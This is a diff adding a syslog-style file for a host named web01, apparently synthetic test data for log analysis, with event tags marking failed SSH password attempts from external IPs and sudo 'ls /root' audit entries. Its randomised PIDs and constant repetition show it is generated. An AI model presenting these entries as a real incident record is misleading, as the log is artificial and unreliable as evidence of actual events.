+Aug 20 01:05:03 web01 NetworkManager[1067]: DHCPv4 lease renewed on eth0
+Aug 20 01:05:07 web01 postfix/smtpd[2744]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5 event=ALERT_SENT
+Aug 20 01:05:13 web01 CRON[918]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:05:17 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:05:22 web01 nginx[2604]: 200 0.402 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:05:23 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:05:26 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:05:31 web01 apt[3086]: Cache clean: removing index files
+Aug 20 01:05:38 web01 avahi-daemon[660]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:05:45 web01 nginx[2389]: 200 0.751 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:05:50 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:05:56 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:05:59 web01 avahi-daemon[367]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:06:04 web01 postfix/smtpd[2534]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:06:05 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:06:11 web01 postfix/smtpd[2605]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:06:13 web01 avahi-daemon[798]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:06:16 web01 sshd[1346]: Accepted publickey for deploy from 10.0.4.17 port 54210 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:06:23 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:06:30 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:06:32 web01 apt[2962]: Cache clean: removing index files
+Aug 20 01:06:39 web01 NetworkManager[1006]: DHCPv4 lease renewed on eth0
+Aug 20 01:06:46 web01 avahi-daemon[537]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:06:47 web01 avahi-daemon[357]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:06:50 web01 sshd[1483]: Accepted publickey for deploy from 10.0.3.11 port 61023 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:06:56 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:07:03 web01 dbus-daemon[880]: systemd-logind: New session started
+Aug 20 01:07:04 web01 NetworkManager[1082]: DHCPv4 lease renewed on eth0
+Aug 20 01:07:05 web01 dbus-daemon[1465]: systemd-logind: New session started
+Aug 20 01:07:10 web01 nginx[2453]: 200 0.724 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:07:16 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:07:22 web01 nginx[2238]: 200 0.518 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:07:24 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:07:27 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:07:28 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:07:32 web01 sshd[1400]: Failed password for invalid user user from 185.220.101.17 port 53733 ssh2 event=LOGIN_FAILED
+Aug 20 01:07:38 web01 apt[3349]: Cache clean: removing index files
+Aug 20 01:07:44 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:07:49 web01 postfix/smtpd[3374]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:07:52 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:07:54 web01 sshd[1451]: Failed password for invalid user admin from 185.158.106.77 port 43255 ssh2 event=LOGIN_FAILED
+Aug 20 01:07:57 web01 systemd[1]: Rotate log files.
+Aug 20 01:07:58 web01 postfix/smtpd[2594]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:07:59 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:08:00 web01 NetworkManager[621]: DHCPv4 lease renewed on eth0
+Aug 20 01:08:01 web01 avahi-daemon[474]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:08:03 web01 avahi-daemon[455]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:08:04 web01 avahi-daemon[633]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:08:06 web01 systemd[1]: Rotate log files.
+Aug 20 01:08:09 web01 apt[4115]: Cache clean: removing index files
+Aug 20 01:08:14 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:08:16 web01 systemd[1]: Rotate log files.
+Aug 20 01:08:17 web01 NetworkManager[626]: DHCPv4 lease renewed on eth0
+Aug 20 01:08:19 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:08:24 web01 nginx[2543]: 200 0.278 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:08:25 web01 CRON[834]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:08:26 web01 apt[3475]: Cache clean: removing index files
+Aug 20 01:08:30 web01 apt[3551]: Cache clean: removing index files
+Aug 20 01:08:35 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:08:40 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:08:44 web01 dbus-daemon[531]: systemd-logind: New session started
+Aug 20 01:08:45 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:08:49 web01 NetworkManager[1102]: DHCPv4 lease renewed on eth0
+Aug 20 01:08:55 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:08:56 web01 nginx[2134]: 200 0.251 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:08:58 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:09:02 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:09:06 web01 sshd[1459]: Accepted publickey for deploy from 10.0.5.23 port 62994 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:09:07 web01 audit[3695]: user=deploy exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:09:14 web01 systemd[1]: Rotate log files.
+Aug 20 01:09:18 web01 sshd[1332]: Failed password for invalid user admin from 89.248.165.114 port 51106 ssh2 event=LOGIN_FAILED
+Aug 20 01:09:22 web01 postfix/smtpd[2497]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:09:25 web01 sshd[1178]: Failed password for invalid user user from 185.158.106.77 port 52265 ssh2 event=LOGIN_FAILED
+Aug 20 01:09:31 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:09:32 web01 avahi-daemon[397]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:09:36 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:09:43 web01 CRON[850]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:09:48 web01 systemd[1]: Rotate log files.
+Aug 20 01:09:52 web01 nginx[2866]: 200 0.781 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:09:59 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:10:02 web01 dbus-daemon[860]: systemd-logind: New session started
+Aug 20 01:10:03 web01 systemd[1]: Rotate log files.
+Aug 20 01:10:05 web01 dbus-daemon[729]: systemd-logind: New session started
+Aug 20 01:10:12 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:10:13 web01 apt[3675]: Cache clean: removing index files
+Aug 20 01:10:15 web01 avahi-daemon[782]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:10:20 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:10:25 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:10:26 web01 CRON[935]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:10:29 web01 nginx[2293]: 200 0.285 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:10:34 web01 dbus-daemon[571]: systemd-logind: New session started
+Aug 20 01:10:36 web01 apt[2562]: Cache clean: removing index files
+Aug 20 01:10:37 web01 apt[2940]: Cache clean: removing index files
+Aug 20 01:10:41 web01 postfix/smtpd[2749]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:10:43 web01 postfix/smtpd[3138]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:10:46 web01 apt[3662]: Cache clean: removing index files
+Aug 20 01:10:51 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:10:53 web01 CRON[872]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:10:54 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:10:58 web01 dbus-daemon[924]: systemd-logind: New session started
+Aug 20 01:11:01 web01 CRON[788]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:11:05 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:11:10 web01 NetworkManager[646]: DHCPv4 lease renewed on eth0
+Aug 20 01:11:12 web01 postfix/smtpd[3013]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:11:13 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:11:15 web01 apt[4065]: Cache clean: removing index files
+Aug 20 01:11:18 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:11:19 web01 sshd[1294]: Failed password for invalid user test from 185.92.220.41 port 44233 ssh2 event=LOGIN_FAILED
+Aug 20 01:11:24 web01 NetworkManager[1112]: DHCPv4 lease renewed on eth0
+Aug 20 01:11:29 web01 avahi-daemon[762]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:11:32 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:11:36 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:11:43 web01 nginx[3174]: 200 0.539 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:11:47 web01 NetworkManager[1027]: DHCPv4 lease renewed on eth0
+Aug 20 01:11:50 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:11:53 web01 CRON[912]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:11:59 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:12:03 web01 audit[1884]: user=www-data exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:12:08 web01 postfix/smtpd[2480]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:12:12 web01 audit[1490]: user=deploy exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:12:14 web01 nginx[2156]: 200 0.272 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:12:19 web01 dbus-daemon[1043]: systemd-logind: New session started
+Aug 20 01:12:24 web01 CRON[789]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:12:30 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:12:32 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:12:34 web01 CRON[894]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:12:41 web01 dbus-daemon[681]: systemd-logind: New session started
+Aug 20 01:12:48 web01 dbus-daemon[975]: systemd-logind: New session started
+Aug 20 01:12:55 web01 systemd[1]: Rotate log files.
+Aug 20 01:13:01 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:13:08 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:13:10 web01 sshd[1255]: Failed password for invalid user test from 89.248.165.114 port 60689 ssh2 event=LOGIN_FAILED
+Aug 20 01:13:17 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:13:20 web01 sshd[1119]: Accepted publickey for deploy from 10.0.5.44 port 57404 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:13:21 web01 postfix/smtpd[2693]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:13:22 web01 dbus-daemon[1500]: systemd-logind: New session started
+Aug 20 01:13:29 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:13:33 web01 systemd[1]: Rotate log files.
+Aug 20 01:13:37 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:13:40 web01 dbus-daemon[1013]: systemd-logind: New session started
+Aug 20 01:13:42 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:13:43 web01 avahi-daemon[778]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:13:46 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:13:51 web01 dbus-daemon[540]: systemd-logind: New session started
+Aug 20 01:13:53 web01 NetworkManager[1049]: DHCPv4 lease renewed on eth0
+Aug 20 01:13:58 web01 sshd[1244]: Accepted publickey for ubuntu from 10.0.3.11 port 56108 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:14:02 web01 postfix/smtpd[2746]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:14:08 web01 systemd[1]: Rotate log files.
+Aug 20 01:14:09 web01 nginx[2791]: 200 0.671 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:14:12 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:14:15 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:14:18 web01 nginx[2802]: 200 0.771 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:14:20 web01 systemd[1]: Rotate log files.
+Aug 20 01:14:23 web01 systemd[1]: Rotate log files.
+Aug 20 01:14:30 web01 CRON[865]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:14:36 web01 sshd[1258]: Failed password for invalid user test from 45.155.23.87 port 51881 ssh2 event=LOGIN_FAILED
+Aug 20 01:14:38 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:14:45 web01 sshd[1139]: Failed password for invalid user admin from 185.92.220.41 port 45077 ssh2 event=LOGIN_FAILED
+Aug 20 01:14:48 web01 audit[2179]: user=root exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:14:55 web01 sshd[1492]: Accepted publickey for ubuntu from 10.0.3.11 port 64358 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:15:00 web01 CRON[739]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:15:02 web01 CRON[884]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:15:06 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:15:12 web01 NetworkManager[1054]: DHCPv4 lease renewed on eth0
+Aug 20 01:15:17 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:15:19 web01 sshd[1199]: Accepted publickey for deploy from 10.0.5.44 port 64810 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:15:22 web01 NetworkManager[1184]: DHCPv4 lease renewed on eth0
+Aug 20 01:15:26 web01 sshd[1370]: Failed password for invalid user test from 89.248.165.114 port 56479 ssh2 event=LOGIN_FAILED
+Aug 20 01:15:30 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:15:37 web01 dbus-daemon[1393]: systemd-logind: New session started
+Aug 20 01:15:40 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:15:47 web01 postfix/smtpd[3356]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:15:48 web01 NetworkManager[1128]: DHCPv4 lease renewed on eth0
+Aug 20 01:15:55 web01 CRON[895]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:15:57 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:16:04 web01 sshd[1113]: Failed password for invalid user admin from 89.248.165.114 port 51455 ssh2 event=LOGIN_FAILED
+Aug 20 01:16:08 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:16:10 web01 postfix/smtpd[2483]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:16:13 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:16:14 web01 avahi-daemon[682]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:16:17 web01 avahi-daemon[420]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:16:18 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:16:24 web01 avahi-daemon[738]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:16:30 web01 sshd[1109]: Failed password for invalid user user from 45.155.23.87 port 42596 ssh2 event=LOGIN_FAILED
+Aug 20 01:16:33 web01 CRON[840]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:16:39 web01 dbus-daemon[933]: systemd-logind: New session started
+Aug 20 01:16:40 web01 apt[2986]: Cache clean: removing index files
+Aug 20 01:16:43 web01 CRON[807]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:16:49 web01 avahi-daemon[584]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:16:50 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:16:55 web01 sshd[1319]: Accepted publickey for ubuntu from 10.0.4.17 port 54772 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:16:56 web01 dbus-daemon[746]: systemd-logind: New session started
+Aug 20 01:17:01 web01 postfix/smtpd[3080]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:17:07 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:17:08 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:17:12 web01 audit[2703]: user=root exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:17:16 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:17:22 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:17:25 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:17:32 web01 systemd[1]: Rotate log files.
+Aug 20 01:17:34 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:17:41 web01 dbus-daemon[1350]: systemd-logind: New session started
+Aug 20 01:17:48 web01 NetworkManager[1090]: DHCPv4 lease renewed on eth0
+Aug 20 01:17:54 web01 CRON[716]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:18:00 web01 apt[3437]: Cache clean: removing index files
+Aug 20 01:18:01 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:18:08 web01 CRON[780]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:18:11 web01 sshd[1485]: Accepted publickey for deploy from 10.0.3.11 port 50599 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:18:17 web01 CRON[920]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:18:24 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:18:27 web01 CRON[811]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:18:31 web01 apt[3291]: Cache clean: removing index files
+Aug 20 01:18:34 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:18:40 web01 sshd[1472]: Failed password for invalid user user from 185.158.106.77 port 42707 ssh2 event=LOGIN_FAILED
+Aug 20 01:18:44 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:18:49 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:18:50 web01 nginx[2627]: 200 0.402 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:18:54 web01 dbus-daemon[936]: systemd-logind: New session started
+Aug 20 01:18:56 web01 NetworkManager[959]: DHCPv4 lease renewed on eth0
+Aug 20 01:19:00 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:19:05 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:19:11 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:19:12 web01 NetworkManager[1015]: DHCPv4 lease renewed on eth0
+Aug 20 01:19:15 web01 sshd[1411]: Accepted publickey for ubuntu from 10.0.5.23 port 52339 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:19:21 web01 avahi-daemon[367]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:19:23 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:19:26 web01 postfix/smtpd[2980]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:19:27 web01 dbus-daemon[1195]: systemd-logind: New session started
+Aug 20 01:19:31 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:19:35 web01 apt[3675]: Cache clean: removing index files
+Aug 20 01:19:37 web01 sshd[1242]: Accepted publickey for deploy from 10.0.3.11 port 60642 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:19:39 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:19:45 web01 CRON[933]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:19:50 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:19:56 web01 sshd[1351]: Failed password for invalid user user from 185.158.106.77 port 62740 ssh2 event=LOGIN_FAILED
+Aug 20 01:19:58 web01 CRON[815]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:20:00 web01 audit[459]: user=ubuntu exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:20:07 web01 NetworkManager[927]: DHCPv4 lease renewed on eth0
+Aug 20 01:20:13 web01 nginx[3126]: 200 0.166 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:20:18 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:20:25 web01 CRON[903]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:20:28 web01 sshd[1171]: Accepted publickey for ubuntu from 10.0.4.17 port 62977 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:20:30 web01 avahi-daemon[363]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:20:33 web01 systemd[1]: Rotate log files.
+Aug 20 01:20:37 web01 avahi-daemon[632]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:20:39 web01 dbus-daemon[588]: systemd-logind: New session started
+Aug 20 01:20:40 web01 nginx[2980]: 200 0.834 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:20:45 web01 postfix/smtpd[2819]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:20:52 web01 systemd[1]: Rotate log files.
+Aug 20 01:20:55 web01 dbus-daemon[960]: systemd-logind: New session started
+Aug 20 01:20:59 web01 NetworkManager[952]: DHCPv4 lease renewed on eth0
+Aug 20 01:21:01 web01 audit[2358]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:21:07 web01 systemd[1]: Rotate log files.
+Aug 20 01:21:11 web01 sshd[1178]: Accepted publickey for ubuntu from 10.0.5.23 port 58488 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:21:14 web01 CRON[939]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:21:20 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:21:27 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:21:33 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:21:35 web01 dbus-daemon[1129]: systemd-logind: New session started
+Aug 20 01:21:40 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:21:45 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:21:47 web01 dbus-daemon[1237]: systemd-logind: New session started
+Aug 20 01:21:52 web01 nginx[2084]: 200 0.677 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:21:59 web01 audit[286]: user=root exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:22:05 web01 apt[3042]: Cache clean: removing index files
+Aug 20 01:22:11 web01 CRON[858]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:22:17 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:22:23 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:22:25 web01 avahi-daemon[700]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:22:29 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:22:35 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:22:39 web01 sshd[1173]: Failed password for invalid user admin from 185.158.106.77 port 59879 ssh2 event=LOGIN_FAILED
+Aug 20 01:22:42 web01 audit[3107]: user=svc.backup exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:22:49 web01 nginx[2267]: 200 0.508 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:22:56 web01 postfix/smtpd[2975]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:22:57 web01 nginx[2250]: 200 0.577 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:23:00 web01 sshd[1248]: Failed password for invalid user admin from 45.155.23.87 port 41658 ssh2 event=LOGIN_FAILED
+Aug 20 01:23:04 web01 audit[1116]: user=ubuntu exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:23:11 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:23:16 web01 apt[2888]: Cache clean: removing index files
+Aug 20 01:23:23 web01 CRON[827]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:23:26 web01 sshd[1334]: Failed password for invalid user admin from 89.248.165.114 port 56562 ssh2 event=LOGIN_FAILED
+Aug 20 01:23:28 web01 CRON[712]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:23:29 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:23:32 web01 sshd[1235]: Accepted publickey for ubuntu from 10.0.5.44 port 52194 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:23:38 web01 postfix/smtpd[2812]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:23:41 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:23:46 web01 systemd[1]: Rotate log files.
+Aug 20 01:23:51 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:23:56 web01 sshd[1448]: Failed password for invalid user user from 185.158.106.77 port 60422 ssh2 event=LOGIN_FAILED
+Aug 20 01:24:01 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:24:05 web01 postfix/smtpd[2747]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:24:10 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:24:12 web01 dbus-daemon[911]: systemd-logind: New session started
+Aug 20 01:24:17 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:24:19 web01 NetworkManager[1085]: DHCPv4 lease renewed on eth0
+Aug 20 01:24:24 web01 sshd[1267]: Failed password for invalid user user from 185.220.101.17 port 44580 ssh2 event=LOGIN_FAILED
+Aug 20 01:24:29 web01 nginx[2612]: 200 0.502 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:24:34 web01 nginx[3090]: 200 0.621 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:24:38 web01 NetworkManager[906]: DHCPv4 lease renewed on eth0
+Aug 20 01:24:42 web01 avahi-daemon[538]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:24:45 web01 NetworkManager[1026]: DHCPv4 lease renewed on eth0
+Aug 20 01:24:50 web01 nginx[2054]: 200 0.842 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:24:55 web01 sshd[1216]: Failed password for invalid user user from 185.220.101.17 port 58927 ssh2 event=LOGIN_FAILED
+Aug 20 01:25:01 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:25:03 web01 sshd[1448]: Accepted publickey for deploy from 10.0.4.17 port 63462 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:25:05 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:25:07 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:25:11 web01 CRON[805]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:25:16 web01 apt[3465]: Cache clean: removing index files
+Aug 20 01:25:23 web01 audit[355]: user=deploy exe="/usr/bin/sudo" args="ls /root" event=AUDIT
